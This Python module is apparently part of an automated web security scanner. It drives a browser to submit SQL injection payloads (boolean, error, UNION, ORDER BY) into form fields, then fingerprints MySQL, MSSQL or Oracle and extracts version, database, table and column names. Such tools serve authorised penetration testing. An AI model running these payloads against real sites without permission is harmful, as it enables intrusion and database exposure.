from typing import Dict, List, Any, Optional
from playwright.async_api import Page
import re
import asyncio

from .base_tester import BaseTester

class SQLInjectionTester(BaseTester):
    """SQL注入漏洞测试模块"""
    
    def __init__(self, agent):
        super().__init__(agent)
        self.name = "sql_injection"
        self.description = "SQL注入漏洞测试"
        self.payloads = {
            "boolean_based": [
                "1' AND '1'='1",
                "1' AND '1'='2",
                "1 AND 1=1",
                "1 AND 1=2"
            ],
            "error_based": [
                "'",
                "\"",
                "\\",
                "1'",
                "1\"",
                "1)"
            ],
            "union_based": [
                "' UNION SELECT 1-- ",
                "' UNION SELECT 1,2-- ",
                "' UNION SELECT 1,2,3-- ",
                "' UNION SELECT 1#",
                "' UNION SELECT 1,2#",
                "' UNION SELECT 1,2,3#"
            ],
            "order_by": [
                "' ORDER BY 1-- ",
                "' ORDER BY 2-- ",
                "' ORDER BY 3-- ",
                "' ORDER BY 1#",
                "' ORDER BY 2#",
                "' ORDER BY 3#"
            ]
        }
        self.db_info_payloads = {
            "mysql": [
                "' UNION SELECT 1,@@version#",
                "' UNION SELECT 1,database()#",
                "' UNION SELECT 1,user()#",
                "' UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1#",
                "' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1#"
            ],
            "mssql": [
                "' UNION SELECT 1,@@version-- ",
                "' UNION SELECT 1,DB_NAME()-- ",
                "' UNION SELECT 1,CURRENT_USER-- ",
                "' UNION SELECT 1,name FROM sysobjects WHERE xtype='U' ORDER BY name OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY-- ",
                "' UNION SELECT 1,name FROM syscolumns WHERE id=OBJECT_ID('users')-- "
            ],
            "oracle": [
                "' UNION SELECT 1,banner FROM v$version WHERE ROWNUM=1-- ",
                "' UNION SELECT 1,owner FROM all_tables WHERE ROWNUM=1-- ",
                "' UNION SELECT 1,table_name FROM all_tables WHERE ROWNUM=1-- ",
                "' UNION SELECT 1,column_name FROM all_tab_columns WHERE table_name='USERS' AND ROWNUM=1-- "
            ]
        }
        self.column_count = 0  # 数据库查询的列数
        self.injectable_points = []  # 可注入的输入点
        self.db_type = ""  # 数据库类型
    
    async def test(self, target: Dict[str, Any]) -> Dict[str, Any]:
        """执行SQL注入测试"""
        self.test_results["status"] = "running"
        
        page = self.agent.page
        if not page:
            self.test_results["status"] = "error"
            self.record_test_result({
                "step": "init",
                "status": "error",
                "message": "浏览器页面未初始化"
            })
            return self.get_test_results()
        
        # 记录开始测试
        self.record_test_result({
            "step": "start",
            "status": "info",
            "message": f"开始SQL注入测试，目标URL: {page.url}"
        })
        
        # 收集输入点
        input_points = await self.collect_input_points(page)
        
        if not input_points:
            self.record_test_result({
                "step": "input_collection",
                "status": "warning",
                "message": "未发现任何输入点"
            })
            self.test_results["status"] = "no_input_points"
            return self.get_test_results()
        
        self.record_test_result({
            "step": "input_collection",
            "status": "success",
            "message": f"发现 {len(input_points)} 个可能的输入点"
        })
        
        # 测试每个输入点
        vulnerable_inputs = []
        
        for idx, input_point in enumerate(input_points):
            # 跳过不适合SQL注入的输入类型
            if input_point["type"] in ["checkbox", "radio", "file", "button", "image", "submit"]:
                continue
                
            # 进行初步测试
            is_injectable = await self._test_input_point(page, input_point, idx)
            
            if is_injectable:
                vulnerable_inputs.append(input_point)
                
                # 记录漏洞
                self.record_vulnerability({
                    "input_point": input_point,
                    "vulnerability": "sql_injection",
                    "details": "该输入点存在SQL注入漏洞"
                })
                
                # 如果找到漏洞，尝试提取更多信息
                if self.column_count > 0:
                    await self._extract_database_info(page, input_point)
        
        # 更新测试状态
        if vulnerable_inputs:
            self.test_results["status"] = "vulnerable"
            self.record_test_result({
                "step": "summary",
                "status": "warning",
                "message": f"发现 {len(vulnerable_inputs)} 个存在SQL注入漏洞的输入点"
            })
        else:
            self.test_results["status"] = "secure"
            self.record_test_result({
                "step": "summary",
                "status": "success",
                "message": "未发现SQL注入漏洞"
            })
        
        return self.get_test_results()
    
    async def _test_input_point(self, page: Page, input_point: Dict[str, Any], idx: int) -> bool:
        """测试特定输入点是否存在SQL注入漏洞"""
        selector = input_point["selector"]
        is_injectable = False
        
        self.record_test_result({
            "step": f"testing_input_{idx}",
            "status": "info",
            "message": f"正在测试输入点: {input_point.get('name', '') or input_point.get('id', '') or selector}"
        })
        
        # 保存原始页面内容用于比较
        original_content = await self.get_page_text(page)
        
        # 首先测试布尔型注入
        bool_results = await self._test_boolean_injection(page, selector, original_content)
        if bool_results["vulnerable"]:
            is_injectable = True
            self.record_test_result({
                "step": f"testing_input_{idx}_boolean",
                "status": "warning",
                "message": f"发现布尔型SQL注入漏洞: {bool_results['details']}"
            })
            
            # 更新输入点信息
            input_point["is_vulnerable"] = True
            input_point["vulnerability_types"] = ["sql_injection_boolean"]
            
            return True
        
        # 测试错误型注入
        error_results = await self._test_error_injection(page, selector, original_content)
        if error_results["vulnerable"]:
            is_injectable = True
            self.record_test_result({
                "step": f"testing_input_{idx}_error",
                "status": "warning",
                "message": f"发现错误型SQL注入漏洞: {error_results['details']}"
            })
            
            # 更新输入点信息
            input_point["is_vulnerable"] = True
            if "vulnerability_types" not in input_point:
                input_point["vulnerability_types"] = []
            input_point["vulnerability_types"].append("sql_injection_error")
            
            return True
        
        # 测试UNION型注入（仅当布尔或错误注入测试成功时）
        union_results = await self._test_union_injection(page, selector, original_content)
        if union_results["vulnerable"]:
            is_injectable = True
            self.record_test_result({
                "step": f"testing_input_{idx}_union",
                "status": "warning",
                "message": f"发现UNION型SQL注入漏洞: {union_results['details']}"
            })
            
            # 更新输入点信息
            input_point["is_vulnerable"] = True
            if "vulnerability_types" not in input_point:
                input_point["vulnerability_types"] = []
            input_point["vulnerability_types"].append("sql_injection_union")
            
            # 记录列数
            self.column_count = union_results.get("columns", 0)
            
            return True
        
        return is_injectable
    
    async def _test_boolean_injection(self, page: Page, selector: str, original_content: str) -> Dict[str, Any]:
        """测试布尔型SQL注入"""
        results = {
            "vulnerable": False,
            "details": "",
            "payload": ""
        }
        
        # 分别测试正、负条件的响应
        for i in range(0, len(self.payloads["boolean_based"]), 2):
            if i+1 >= len(self.payloads["boolean_based"]):
                break
                
            true_payload = self.payloads["boolean_based"][i]
            false_payload = self.payloads["boolean_based"][i+1]
            
            # 测试true条件
            await self._input_and_submit(page, selector, true_payload)
            await asyncio.sleep(1)  # 等待页面加载
            true_content = await self.get_page_text(page)
            
            # 返回到原始页面
            await page.go_back()
            await asyncio.sleep(1)
            
            # 测试false条件
            await self._input_and_submit(page, selector, false_payload)
            await asyncio.sleep(1)  # 等待页面加载
            false_content = await self.get_page_text(page)
            
            # 返回到原始页面
            await page.go_back()
            await asyncio.sleep(1)
            
            # 分析两种响应的差异
            if true_content != false_content:
                # 进一步检查数据差异（例如，true条件返回数据而false条件没有）
                if (len(true_content) - len(false_content)) > 50 or "no results" in false_content.lower():
                    results["vulnerable"] = True
                    results["details"] = f"布尔型测试成功 - 正条件({true_payload})与负条件({false_payload})的响应不同"
                    results["payload"] = true_payload
                    break
        
        return results
    
    async def _test_error_injection(self, page: Page, selector: str, original_content: str) -> Dict[str, Any]:
        """测试错误型SQL注入"""
        results = {
            "vulnerable": False,
            "details": "",
            "payload": ""
        }
        
        # 测试可能导致SQL错误的有效载荷
        error_keywords = [
            "sql syntax", "syntax error", "unclosed quotation", "unterminated string",
            "mysql_fetch", "mysql error", "sql error", "odbc error", "oracle error",
            "incorrect syntax", "unexpected token", "unexpected end", "invalid query",
            "database error"
        ]
        
        for payload in self.payloads["error_based"]:
            await self._input_and_submit(page, selector, payload)
            await asyncio.sleep(1)  # 等待页面加载
            
            # 获取响应内容
            error_content = await self.get_page_text(page)
            
            # 检查是否包含SQL错误关键字
            for keyword in error_keywords:
                if keyword in error_content.lower():
                    results["vulnerable"] = True
                    results["details"] = f"错误型测试成功 - 载荷({payload})触发了SQL错误：{keyword}"
                    results["payload"] = payload
                    break
            
            # 返回到原始页面
            await page.go_back()
            await asyncio.sleep(1)
            
            if results["vulnerable"]:
                break
        
        return results
    
    async def _test_union_injection(self, page: Page, selector: str, original_content: str) -> Dict[str, Any]:
        """测试UNION型SQL注入"""
        results = {
            "vulnerable": False,
            "details": "",
            "payload": "",
            "columns": 0
        }
        
        # 首先尝试确定列数
        max_columns = 10  # 最大测试到10列
        column_count = 0
        column_payload = ""
        
        # 使用ORDER BY确定列数
        for i in range(1, max_columns + 1):
            for base in ["' ORDER BY", "\" ORDER BY", ") ORDER BY"]:
                payload = f"{base} {i}-- "
                
                await self._input_and_submit(page, selector, payload)
                await asyncio.sleep(1)  # 等待页面加载
                
                content = await self.get_page_text(page)
                
                # 检查是否有错误（说明列数超过了）
                if any(keyword in content.lower() for keyword in ["error", "unknown", "invalid"]):
                    column_count = i - 1
                    column_payload = payload
                    break
                
                # 返回到原始页面
                await page.go_back()
                await asyncio.sleep(1)
            
            if column_count > 0:
                break
        
        # 如果找到列数，尝试UNION注入
        if column_count > 0:
            # 构建UNION测试载荷
            union_values = ",".join([str(i) for i in range(1, column_count + 1)])
            union_payload = f"' UNION SELECT {union_values}-- "
            
            await self._input_and_submit(page, selector, union_payload)
            await asyncio.sleep(1)  # 等待页面加载
            
            union_content = await self.get_page_text(page)
            
            # 检查响应中是否包含UNION查询的数字标记
            for i in range(1, column_count + 1):
                if str(i) in union_content and str(i) not in original_content:
                    results["vulnerable"] = True
                    results["details"] = f"UNION型测试成功 - 确定列数为{column_count}，并且可以回显数据"
                    results["payload"] = union_payload
                    results["columns"] = column_count
                    break
            
            # 返回到原始页面
            await page.go_back()
            await asyncio.sleep(1)
        
        return results
    
    async def _extract_database_info(self, page: Page, input_point: Dict[str, Any]) -> None:
        """提取数据库信息"""
        selector = input_point["selector"]
        
        # 确定数据库类型
        await self._determine_db_type(page, selector)
        
        # 根据数据库类型选择适当的提取载荷
        db_payloads = self.db_info_payloads.get(self.db_type, self.db_info_payloads["mysql"])
        
        for payload in db_payloads:
            # 替换载荷中的列数
            if self.column_count > 1:
                # 调整载荷以匹配列数
                union_values = ",".join(["1" if i != 2 else payload.split(",")[1].strip() for i in range(1, self.column_count + 1)])
                payload = f"' UNION SELECT {union_values}"
            
            await self._input_and_submit(page, selector, payload)
            await asyncio.sleep(1)  # 等待页面加载
            
            # 获取响应
            info_content = await self.get_page_text(page)
            
            # 分析提取的信息
            if "version" in payload:
                self._analyze_db_version(info_content)
            elif "database()" in payload or "DB_NAME()" in payload:
                self._analyze_db_name(info_content)
            elif "table_name" in payload or "name FROM sysobjects" in payload:
                self._analyze_tables(info_content)
            elif "column_name" in payload or "name FROM syscolumns" in payload:
                self._analyze_columns(info_content)
            
            # 返回到原始页面
            await page.go_back()
            await asyncio.sleep(1)
    
    async def _determine_db_type(self, page: Page, selector: str) -> None:
        """确定数据库类型"""
        # 默认假设为MySQL
        self.db_type = "mysql"
        
        # 测试MySQL特有函数
        await self._input_and_submit(page, selector, "' AND @@version-- ")
        await asyncio.sleep(1)
        content = await self.get_page_text(page)
        
        if not "error" in content.lower():
            self.db_type = "mysql"
            await page.go_back()
            await asyncio.sleep(1)
            return
        
        # 返回到原始页面
        await page.go_back()
        await asyncio.sleep(1)
        
        # 测试MSSQL特有函数
        await self._input_and_submit(page, selector, "' AND @@SERVERNAME-- ")
        await asyncio.sleep(1)
        content = await self.get_page_text(page)
        
        if not "error" in content.lower():
            self.db_type = "mssql"
            await page.go_back()
            await asyncio.sleep(1)
            return
        
        # 返回到原始页面
        await page.go_back()
        await asyncio.sleep(1)
        
        # 测试Oracle特有语法
        await self._input_and_submit(page, selector, "' AND ROWNUM=1-- ")
        await asyncio.sleep(1)
        content = await self.get_page_text(page)
        
        if not "error" in content.lower():
            self.db_type = "oracle"
            await page.go_back()
            await asyncio.sleep(1)
            return
        
        # 返回到原始页面
        await page.go_back()
        await asyncio.sleep(1)
    
    def _analyze_db_version(self, content: str) -> None:
        """分析数据库版本信息"""
        # 提取版本信息的正则表达式
        patterns = {
            "mysql": r"(\d+\.\d+\.\d+)(?:-\w+)?",
            "mssql": r"Microsoft SQL Server (\d+)",
            "oracle": r"Oracle Database (\d+\w?)"
        }
        
        pattern = patterns.get(self.db_type, patterns["mysql"])
        
        match = re.search(pattern, content)
        if match:
            version = match.group(1)
            self.record_test_result({
                "step": "db_info",
                "status": "info",
                "message": f"数据库版本: {version}"
            })
    
    def _analyze_db_name(self, content: str) -> None:
        """分析数据库名称"""
        # 简单提取数据库名称（假设它在内容中独立存在）
        lines = content.split("\n")
        for line in lines:
            line = line.strip()
            if len(line) > 0 and len(line) < 30 and not line.startswith("<") and not "=" in line:
                self.record_test_result({
                    "step": "db_info",
                    "status": "info",
                    "message": f"数据库名称: {line}"
                })
                break
    
    def _analyze_tables(self, content: str) -> None:
        """分析表名"""
        # 简单提取表名（假设它在内容中独立存在）
        lines = content.split("\n")
        for line in lines:
            line = line.strip()
            if len(line) > 0 and len(line) < 30 and not line.startswith("<") and not "=" in line:
                self.record_test_result({
                    "step": "db_info",
                    "status": "info",
                    "message": f"表名: {line}"
                })
                break
    
    def _analyze_columns(self, content: str) -> None:
        """分析列名"""
        # 简单提取列名（假设它在内容中独立存在）
        lines = content.split("\n")
        for line in lines:
            line = line.strip()
            if len(line) > 0 and len(line) < 30 and not line.startswith("<") and not "=" in line:
                self.record_test_result({
                    "step": "db_info",
                    "status": "info",
                    "message": f"列名: {line}"
                })
                break
    
    async def _input_and_submit(self, page: Page, selector: str, value: str) -> None:
        """输入内容并提交表单"""
        try:
            # 清除原有内容
            await page.fill(selector, "")
            # 输入新内容
            await page.fill(selector, value)
            
            # 查找可能的提交按钮
            form = await page.query_selector(f"{selector} >> xpath=ancestor::form")
            
            if form:
                # 如果输入在表单中，查找表单的提交按钮
                submit_button = await form.query_selector('input[type="submit"], button[type="submit"], button:has-text("Submit"), button')
                if submit_button:
                    await submit_button.click()
                    return
            
            # 如果没有找到提交按钮，尝试按回车键
            await page.press(selector, "Enter")
            
        except Exception as e:
            # 忽略错误，表单提交可能会导致页面跳转
            pass
    
    async def verify_vulnerability(self, page: Page, input_selector: str, payload: str) -> Dict[str, Any]:
        """验证特定输入点是否存在漏洞"""
        result = {
            "vulnerable": False,
            "details": "",
            "payload": payload
        }
        
        # 保存原始内容
        original_content = await self.get_page_text(page)
        
        # 注入测试载荷
        await self._input_and_submit(page, input_selector, payload)
        await asyncio.sleep(1)  # 等待页面加载
        
        # 获取注入后内容
        injected_content = await self.get_page_text(page)
        
        # 检查是否触发SQL错误
        error_keywords = ["sql syntax", "mysql error", "sql error", "odbc error", "oracle error"]
        if any(keyword in injected_content.lower() for keyword in error_keywords):
            result["vulnerable"] = True
            result["details"] = "载荷触发了SQL错误"
        
        # 检查是否直接返回数据
        if "union select" in payload.lower():
            for i in range(1, 10):
                if str(i) in injected_content and str(i) not in original_content:
                    result["vulnerable"] = True
                    result["details"] = f"UNION查询成功，检测到回显位置 ({i})"
                    break
        
        # 返回到原始页面
        await page.go_back()
        await asyncio.sleep(1)
        
        return result 